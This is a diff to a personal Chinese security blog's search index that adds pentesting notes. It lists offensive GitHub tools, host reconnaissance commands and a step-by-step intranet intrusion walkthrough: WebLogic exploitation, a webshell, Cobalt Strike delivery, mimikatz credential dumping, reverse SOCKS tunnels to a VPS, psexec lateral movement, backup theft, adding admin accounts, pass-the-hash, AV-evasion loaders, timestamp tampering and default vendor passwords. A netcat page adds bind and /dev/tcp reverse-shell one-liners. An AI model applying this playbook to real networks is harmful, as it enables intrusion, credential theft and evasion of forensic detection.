@@ -1,6 +1,375 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>渗透工具项目推荐</title>
+    <url>/2025/04/23/github%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E6%8E%A8%E8%8D%90/</url>
+    <content><![CDATA[<h1 id="GitHub项目："><a href="#GitHub项目：" class="headerlink" title="GitHub项目："></a>GitHub项目：</h1><span id="more"></span>
+
+<h3 id="内网："><a href="#内网：" class="headerlink" title="内网："></a>内网：</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件："><a href="#bp插件：" class="headerlink" title="bp插件："></a>bp插件：</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞："><a href="#探测漏洞：" class="headerlink" title="探测漏洞："></a>探测漏洞：</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h5 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h5><h6 id="nacos-vul"><a href="#nacos-vul" class="headerlink" title="nacos_vul"></a><a href="https://github.com/Pizz33/nacos_vul">nacos_vul</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->
+
+<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6>]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>project</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网信息搜集</title>
+    <url>/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
+    <content><![CDATA[<h1 id="Windows常用搜集命令："><a href="#Windows常用搜集命令：" class="headerlink" title="Windows常用搜集命令："></a>Windows常用搜集命令：</h1><table>
+<thead>
+<tr>
+<th align="left"><code>ipconfig /all</code></th>
+<th>查询网络配置信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td>
+<td>查询操作系统版本-中文</td>
+</tr>
+<tr>
+<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</td>
+<td>查询操作系统版本-英文</td>
+</tr>
+<tr>
+<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
+<td>查看系统体系结构</td>
+</tr>
+<tr>
+<td align="left">wmic product get name,version</td>
+<td>安装软件版本信息</td>
+</tr>
+<tr>
+<td align="left">powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</td>
+<td>收集软件版本信息</td>
+</tr>
+<tr>
+<td align="left">wmic service list brief</td>
+<td>查询本机服务信息</td>
+</tr>
+<tr>
+<td align="left"><code>tasklist /svc</code></td>
+<td>查询进程列表信息</td>
+</tr>
+<tr>
+<td align="left">wmic startup get command,caption</td>
+<td>查看启动程序信息</td>
+</tr>
+<tr>
+<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
+<td>查看计划任务信息</td>
+</tr>
+<tr>
+<td align="left">net statistics workstation</td>
+<td>查看主机开机时间</td>
+</tr>
+<tr>
+<td align="left">net user</td>
+<td>查询用户列表信息</td>
+</tr>
+<tr>
+<td align="left">net localgroup administrators</td>
+<td>获取本地管理员（通常含有域用户）</td>
+</tr>
+<tr>
+<td align="left">query user || qwinsta</td>
+<td>查看当前在线用户信息</td>
+</tr>
+<tr>
+<td align="left">net session</td>
+<td>查客户端会话信息(管理员权限)</td>
+</tr>
+<tr>
+<td align="left"><code>netstat -ano</code></td>
+<td>查询端口列表信息</td>
+</tr>
+<tr>
+<td align="left"><code>Systeminfo</code></td>
+<td>查询补丁列表信息</td>
+</tr>
+<tr>
+<td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
+<td>wmic来识别安装在系统中的补丁</td>
+</tr>
+<tr>
+<td align="left"><code>net share</code></td>
+<td>查看本机共享信息</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h1 id="LINUX常用搜集命令："><a href="#LINUX常用搜集命令：" class="headerlink" title="LINUX常用搜集命令："></a>LINUX常用搜集命令：</h1><table>
+<thead>
+<tr>
+<th><code>ifconfig -a</code> 或 <code>ip a</code></th>
+<th>查询网络配置信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>uname -a</code></td>
+<td>查询系统内核及版本信息</td>
+</tr>
+<tr>
+<td><code>cat /etc/os-release</code> 或 <code>lsb_release -a</code></td>
+<td>查询操作系统版本信息</td>
+</tr>
+<tr>
+<td><code>arch</code> 或 <code>uname -m</code></td>
+<td>查看系统体系结构</td>
+</tr>
+<tr>
+<td><code>dpkg -l</code> (Debian&#x2F;Ubuntu) 或 <code>rpm -qa</code> (RHEL&#x2F;CentOS)</td>
+<td>安装软件版本信息</td>
+</tr>
+<tr>
+<td><code>service --status-all</code> 或 <code>systemctl list-units --type=service</code></td>
+<td>查询本机服务信息</td>
+</tr>
+<tr>
+<td><code>ps aux</code></td>
+<td>查询进程列表信息</td>
+</tr>
+<tr>
+<td><code>ls /etc/init.d/</code> 或 <code>ls /etc/systemd/system/</code></td>
+<td>查看启动程序信息</td>
+</tr>
+<tr>
+<td><code>crontab -l</code> 或 <code>ls /etc/cron.*</code></td>
+<td>查看计划任务信息</td>
+</tr>
+<tr>
+<td><code>uptime</code></td>
+<td>查看主机运行时间</td>
+</tr>
+<tr>
+<td><code>cat /etc/passwd</code></td>
+<td>查询用户列表信息</td>
+</tr>
+<tr>
+<td><code>cat /etc/group</code></td>
+<td>获取用户组信息（包括管理员组）</td>
+</tr>
+<tr>
+<td><code>who</code> 或 <code>w</code></td>
+<td>查看当前在线用户信息</td>
+</tr>
+<tr>
+<td><code>netstat -antp</code> 或 <code>ss -tulnp</code></td>
+<td>查询端口列表信息</td>
+</tr>
+<tr>
+<td><code>apt list --installed</code> (Debian&#x2F;Ubuntu) 或 <code>yum list installed</code> (RHEL&#x2F;CentOS)</td>
+<td>查询已安装软件包（包含部分补丁信息）</td>
+</tr>
+<tr>
+<td><code>ls /mnt/</code> 或 <code>mount</code></td>
+<td>查看挂载的共享信息</td>
+</tr>
+<tr>
+<td><code>df -h</code></td>
+<td>查看磁盘使用情况</td>
+</tr>
+<tr>
+<td><code>free -h</code></td>
+<td>查看内存使用情况</td>
+</tr>
+<tr>
+<td><code>lscpu</code></td>
+<td>查看CPU信息</td>
+</tr>
+<tr>
+<td><code>dmidecode -t system</code></td>
+<td>查看系统硬件信息（需要root权限）</td>
+</tr>
+<tr>
+<td><code>journalctl -u &lt;service_name&gt;</code></td>
+<td>查看特定服务的日志信息</td>
+</tr>
+<tr>
+<td><code>cat /etc/hosts</code></td>
+<td>查看主机名和IP映射</td>
+</tr>
+<tr>
+<td><code>hostnamectl</code></td>
+<td>查看主机名和系统信息</td>
+</tr>
+</tbody></table>
+<p>注：</p>
+<ol>
+<li>部分命令可能需要root权限才能获取完整信息（可在命令前加<code>sudo</code>）</li>
+<li>不同Linux发行版可能需要使用对应的包管理命令（apt&#x2F;yum&#x2F;dnf等）</li>
+<li>对于较新的系统，推荐使用<code>ip</code>替代<code>ifconfig</code>，使用<code>ss</code>替代<code>netstat</code></li>
+</ol>
+<h1 id="内存码的注入："><a href="#内存码的注入：" class="headerlink" title="内存码的注入："></a>内存码的注入：</h1><p>[内存马注入]: <a href="https://github.com/pap1rman/JNDIExploit-modify">https://github.com/pap1rman/JNDIExploit-modify</a>	“参考如下：”</p>
+<ul>
+<li><a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
+<li><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li>
+<li><a href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
+</ul>
+<h1 id="完整的内网渗透"><a href="#完整的内网渗透" class="headerlink" title="完整的内网渗透"></a>完整的内网渗透</h1><h2 id="简略："><a href="#简略：" class="headerlink" title="简略："></a>简略：</h2><p>1.获取shell—无论是sql注入提权还是webshell还是直接ssh等，获取shell后</p>
+<p>2.cs上线—下载powershell等工具或者jar直接上线</p>
+<p>3.如上信息搜集，进行横向，域内横向，类似于操作1.直接找shell</p>
+<p>（3）.可以尝试<strong>sock代理</strong>，使同一网，进行msf的扫描，有的话就是捷径</p>
+<p>（3）.有备份的话可以直接拷贝<strong>全量备份</strong>，它能在你本地横？可以cmd覆盖</p>
+<p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
+<p>(技巧)[<a href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
+<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
+<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershel。</p>
+<p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
+<p>3.执行powershel，然后CS成功上线。</p>
+<p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
+<p>shell systeminfo</p>
+<p>shell ipconfig</p>
+<p>5。通过cs将ladon上传到目标系统中，通过ladon扫描内网系统.,发现目标有一个WEB服务主机。</p>
+<p>landon 192.168.200.1&#x2F;24    OsScan</p>
+<p>6。通过mimikatz成功读取到用户名和密码hash值，通过md5对密码的NTML进行解密，成功解密为P@sssw0rd。</p>
+<p>7,通过ladon进行批量ms17-010扫描，发现存有几个系统存在ms17-010漏洞</p>
+<p>landon 192.168.200.1&#x2F;24 MS17010</p>
+<p>8.在公网VPS上执行以下命令，将1900端口收到的代理请求转交给反连1200端口的主机</p>
+<p>ew -s rcsocks -l 1900 -e 1200</p>
+<p>9.将ew通过冰蝎上传目标系统中，并执行以下命令,开启目标主机socks5服务并反向连接到中转机器的1200端口</p>
+<p>ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e 1200</p>
+<p>10.本地WINDOWS在本地使用sockscap配置好socke5代理，本地虚拟机里面的kali的MSF，kali的代理配置比较方便，先vim &#x2F;etc&#x2F;proxychains.conf ，添加sock5嗲了</p>
+<p>socks5  目标IP  1900</p>
+<p>11.在kali下msf要挂代理，就直接：proxychains msfconsole，在windows中sockscap添加ie浏览器访问的socks5代理，用于内网web访问，但是测试弱口令发现无法进入。</p>
+<p>12.继续信息收集，查看登录凭证，并有任何东西</p>
+<p>shell  cmdkey  &#x2F;l</p>
+<p>13.查看共享计算机列表，并尝试访问计算机C盘,发现备份计算机可以访问共享</p>
+<p>shell  ne  view</p>
+<p>ls   \VEEAM-BACKUP$</p>
+<p>14.通过ping目标共享计算机，查询出IP地址为192.168.200.6</p>
+<p>ping   VEEAM-BACKUP</p>
+<p>15.在CS上创建一个监听器</p>
+<p>中转—监听—名字（c2)、payload(windows&#x2F;beacon_reverse_tcp)、listen host :192.168.200.21  、listen port:4444</p>
+<p>16.接着使用psexec_psh尝试上线192.168.200.6这台服务器,成功上线，起初发现该主机上并没有任何东西</p>
+<p>jump  psexec _psh  192.168.200.6</p>
+<p>17.通过之前ladon探测发现内网中22,1,5,11主机是linux系统，尝试弱口令，发现192.168.200.22存在弱口令，linux主机上并没有任何可利用的</p>
+<p>ssh  192.168.200.22  root  123456</p>
+<p>18.在VEEAM-BACKUP主机上发现了有一个Backup的文件，里面存放了三个机器的备份，它是一款叫Veeam® Backup &amp; Replication的软件，他的功能是专门为Vsphere等做备份。</p>
+<p>19.发现VEEAM-BACKUP不出外网，这里通过7z将Backup文件进行命令打包压缩。在目标系统中的web目录下，通过命令共享将Backup文件拷贝到目标系统中。</p>
+<p>19.在本地安装Backup &amp; Replication，并将备份文件进行恢复还原，发现登录窗口处有默认的用户名和密码以及IP，这个需要在目标内网中登录，这里可以通过在目标系统中通过cs开启sock4代理，本地通过Proxifier加载Backup &amp; Replication的sock4代理成功访问。</p>
+<p>20.本地下载的那个全量备份在本地还原也很简单，只需要装了软件双击就回自动打开软件进行还原</p>
+<p>21.通过老毛桃的win pe进入系统，这里重命名cmd.exe为osk.exe将原来C盘中的\windows\system32\osk.exe给覆盖了，这样子在开机的时候打开屏幕键盘就会弹出SYSTEM权限的命令行。</p>
+<p>22.通过命令查询，发现还原的系统是域普通主机，这里通过命令添加用并将域用户修改密码后添加到本地管理员组成功进入了系统。</p>
+<p>net user   hanli  quer1345 @  &#x2F;add</p>
+<p>net localgroup administrators  hanli  &#x2F;add</p>
+<p>23.在虚拟机中通过执行cs的后门成功上线，并通过cs的hasdump读取hash,并通过该hash进行域控HASH传递</p>
+<h2 id="免杀项目："><a href="#免杀项目：" class="headerlink" title="免杀项目："></a>免杀项目：</h2><p><a href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></p>
+<p><a href="https://github.com/Pizz33/Qianji">https://github.com/Pizz33/Qianji</a></p>
+<p>可以定期去github上关注一些好用的bof</p>
+<h1 id="应对技巧："><a href="#应对技巧：" class="headerlink" title="应对技巧："></a>应对技巧：</h1><p>1.上传的木马都是新的</p>
+<p>​	可以查看更改时间和最近操作得到，得到直接保存沙盒删除溯源一条龙</p>
+<p>注：<a href="https://github.com/MsF-NTDLL/ChTimeStamp">https://github.com/MsF-NTDLL/ChTimeStamp</a></p>
+<p>该项目可以实现修改文件时间</p>
+<h1 id="默认口令："><a href="#默认口令：" class="headerlink" title="默认口令："></a>默认口令：</h1><p>系统管理员：system&#x2F;system<br>    集团管理员(A8-v5集团版) group-admin&#x2F;123456<br>    单位管理员(A8-V5企业版) admin1&#x2F;admin123456<br>    审计管理员(所有版本) audit-admin&#x2F;seeyon123456</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Computer-info</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令的熟悉</title>
+    <url>/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/</url>
+    <content><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nc、待补充</p>
+<span id="more"></span>
+
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc:"></a>nc:</h3><p>​	常用：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向连接</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> /bin/bash <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#反向连接</span></span><br><span class="line">bash <span class="literal">-i</span> &gt; /dev/tcp/<span class="number">81</span>.X.X.X/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只允许192.168.1.100连接</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听并记录访问者信息</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-v</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">tee</span> <span class="literal">-a</span> access.log</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left"><strong>用途</strong></th>
+<th align="left"><strong>命令示例</strong></th>
+<th align="left"><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">临时聊天</td>
+<td align="left"><code>nc -l -p 8080</code> + <code>nc &lt;IP&gt; 8080</code></td>
+<td align="left">双向文本通信</td>
+</tr>
+<tr>
+<td align="left">文件传输（发送→接收）</td>
+<td align="left"><code>nc -l -p 8080 &gt; file</code> + <code>nc &lt;IP&gt; 8080 &lt; file</code></td>
+<td align="left">替代SCP&#x2F;FTP</td>
+</tr>
+<tr>
+<td align="left">反向Shell</td>
+<td align="left"><code>nc -l -p 8080 -e /bin/bash</code> + <code>nc &lt;IP&gt; 8080</code></td>
+<td align="left"><strong>高风险！仅测试用</strong></td>
+</tr>
+<tr>
+<td align="left">端口扫描</td>
+<td align="left"><code>nc -zv &lt;IP&gt; 8080</code></td>
+<td align="left">检查端口状态</td>
+</tr>
+<tr>
+<td align="left">HTTP调试</td>
+<td align="left"><code>nc -l -p 8080</code> + <code>curl http://&lt;IP&gt;:8080</code></td>
+<td align="left">查看原始HTTP请求</td>
+</tr>
+<tr>
+<td align="left">TCP代理</td>
+<td align="left">&#96;nc -l -p 8080</td>
+<td align="left">nc &lt;目标IP&gt; 80&#96;</td>
+</tr>
+<tr>
+<td align="left">十六进制调试</td>
+<td align="left">&#96;nc -l -p 8080</td>
+<td align="left">hexdump -C&#96;</td>
+</tr>
+<tr>
+<td align="left">持久监听</td>
+<td align="left"><code>while true; do nc -l -p 8080; done</code></td>
+<td align="left">支持多次连接</td>
+</tr>
+<tr>
+<td align="left">SSL加密通信</td>
+<td align="left"><code>ncat -l -p 8080 --ssl</code> + <code>ncat &lt;IP&gt; 8080 --ssl</code></td>
+<td align="left">需安装<code>ncat</code></td>
+</tr>
+</tbody></table>
+<p>注：nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i”			&#x2F;&#x2F;j交互模式</p>
+<p>​	nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i 2&gt;&amp;1”		&#x2F;&#x2F;全回显，2&gt;&amp;1 表示将 标准错误（stderr） 重定向到 标准输出（stdout），确保错误信息也能回显。</p>
+<table>
+<thead>
+<tr>
+<th align="left">需求</th>
+<th align="left">命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">简单回显（<code>nc</code>）</td>
+<td align="left"><code>nc -l -p 8080 -e &quot;/bin/bash -i 2&gt;&amp;1&quot;</code></td>
+</tr>
+<tr>
+<td align="left">完整终端支持（<code>nc</code>）</td>
+<td align="left"><code>nc -l -p 8080 -e &quot;script -q -c &#39;/bin/bash -i&#39; /dev/null 2&gt;&amp;1&quot;</code></td>
+</tr>
+<tr>
+<td align="left">最佳兼容性（<code>socat</code>）</td>
+<td align="left"><code>socat TCP-LISTEN:8080,reuseaddr,fork EXEC:&quot;/bin/bash -i&quot;,pty,stderr</code></td>
+</tr>
+</tbody></table>
+<h5 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找 nc 进程</span></span><br><span class="line">ps aux | grep &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接用 pkill 终止所有 nc 进程</span></span><br><span class="line">pkill -f &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死进程（假设进程ID是 12345）</span></span><br><span class="line">kill 12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者强制杀死</span></span><br><span class="line">kill -9 12345</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>computer</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSRF记录</title>
     <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
@@ -414,8 +783,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>js</tag>
         <tag>api</tag>
+        <tag>js</tag>
         <tag>Cybersecurity</tag>
         <tag>jwt</tag>
         <tag>keys</tag>
@@ -566,8 +935,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Honeypot</tag>
         <tag>Cybersecurity</tag>
+        <tag>Honeypot</tag>
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
